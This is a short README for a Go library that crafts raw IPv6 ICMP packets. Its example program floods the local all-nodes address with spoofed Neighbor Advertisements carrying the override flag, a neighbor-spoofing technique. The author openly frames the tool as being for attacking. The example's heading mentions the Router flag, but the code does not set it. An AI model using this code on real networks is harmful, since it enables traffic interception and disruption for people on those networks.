## HackICMP6

### Go package to mess with IPv6 ICMP packets

#### Example Neighbor Advertisement with Router flag set

`import github.com/BobBurns/hackicmp6/hi6`

```go

	t := hi6.ICMP6{
		Iface:      os.Args[1],
		DstIP:      "ff02::1",
		SrcIP:      "fe80::dead:beef",
		SrcMAC:     "10:0b:a9:ba:aa:ad",
		DstMAC:     "33:33:00:00:00:01",
		Type:       hi6.ICMPTypeNeighborAdvertisement,
		Code:       0,
		NA_Flags:   hi6.NA_FLAG_OVERRIDE,
		TargetAddr: "fe80::3",
	}

	err := t.BuildICMPPacket()
	if err != nil {
		fmt.Println("errors found...")
		fmt.Println(err)
		fmt.Println("exiting.")
		os.Exit(-1)
	}
	for {
		fmt.Printf(".")
		err = t.Send()
		if err != nil {
			fmt.Println(err)
			os.Exit(-1)
		}
		time.Sleep(time.Duration(1 * time.Second))
	}
```

For more examples see examples/

I would like to add Extention Header support as well as pcap listener for funner attacking


